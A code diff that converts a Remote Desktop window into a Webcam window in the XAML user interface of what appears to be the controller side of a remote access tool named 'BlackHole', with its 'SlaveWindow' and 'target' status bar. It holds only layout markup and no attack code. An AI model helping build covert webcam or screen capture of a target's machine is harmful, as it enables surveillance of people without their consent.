@@ -1,4 +1,4 @@
-﻿<src:SlaveWindow x:Class="BlackHole.Master.RemoteDesktopWindow"
+﻿<src:SlaveWindow x:Class="BlackHole.Master.WebcamWindow"
         xmlns:src="clr-namespace:BlackHole.Master"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
@@ -6,14 +6,14 @@
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
         xmlns:local="clr-namespace:BlackHole.Master"
         mc:Ignorable="d"
-        Title="Remote Desktop" Height="800" Width="1000">
+        Title="Webcam" Height="800" Width="1000">
     <Grid>
         <Grid.RowDefinitions>
             <RowDefinition Height="Auto" />
             <RowDefinition Height="*" />
             <RowDefinition Height="Auto" />
         </Grid.RowDefinitions>
-        <GroupBox Grid.Row="0"  Header="Remote desktop commands" Margin="10">
+        <GroupBox Grid.Row="0"  Header="Webcam commands" Margin="10">
             <Grid>
                 <Grid.ColumnDefinitions>
                     <ColumnDefinition Width="auto" />
@@ -23,16 +23,16 @@
                     <ColumnDefinition Width="*" />
                     <ColumnDefinition Width="*" />
                 </Grid.ColumnDefinitions>
-                <Label  Grid.Column="0" Content="FPS: " />
-                <TextBox  Grid.Column="1" Name="TxtBoxRate" ToolTip="Capture rate (FPS)" Text="10" />
+                <Label  Grid.Column="0" Content="Avg. FPS: " />
+                <TextBox  Grid.Column="1" Name="TxtBoxRate" ToolTip="Average rate (FPS)" IsEnabled="False" />
                 <Label  Grid.Column="2" Content="Quality: " />
                 <TextBox  Grid.Column="3" Name="TxtBoxQuality" ToolTip="Image quality" Text="20" />
                 <Button Grid.Column="4" Name="BtnStart" Content="Start" Foreground="DarkGreen" Click="OnStartCapture" />
                 <Button Grid.Column="5" Name="BtnStop" Content="Stop" Foreground="DarkRed" Click="OnStopCapture" />
             </Grid>
         </GroupBox>
-        <GroupBox Grid.Row="1" Header="Stream"  Margin="10">
-            <Image Name="ScreenCaptureImage" />
+        <GroupBox Grid.Row="1" Header="Webcam Stream"  Margin="10">
+            <Image Name="WebcamImage" />
         </GroupBox>
         <ContentPresenter Grid.Row="2" Name="TargetStatusPresenter" ContentTemplate="{StaticResource TargetSlaveStatusBar}" />
     </Grid>
